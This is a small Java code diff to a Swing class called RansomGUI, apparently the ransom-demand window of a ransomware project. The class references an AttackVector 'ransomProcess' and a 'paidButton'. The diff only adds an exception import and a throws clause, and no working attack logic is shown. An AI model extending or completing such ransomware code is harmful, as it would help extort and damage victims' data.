@@ -13,6 +13,7 @@ import javax.swing.JPanel;
 
 import Agent.Attack.AttackVector;
 import Agent.exceptions.AttackVectorException;
+import Agent.exceptions.InOutException;
 import Agent.exceptions.RansomwareException;
 
 public class RansomGUI extends JFrame implements ActionListener {
@@ -23,7 +24,7 @@ public class RansomGUI extends JFrame implements ActionListener {
 	private JButton paidButton;
 	private AttackVector ransomProcess;
 
-	public RansomGUI() {
+	public RansomGUI() throws InOutException {
 		label = new JLabel();
 		panel = new JPanel();
 		panel.setVisible(true);
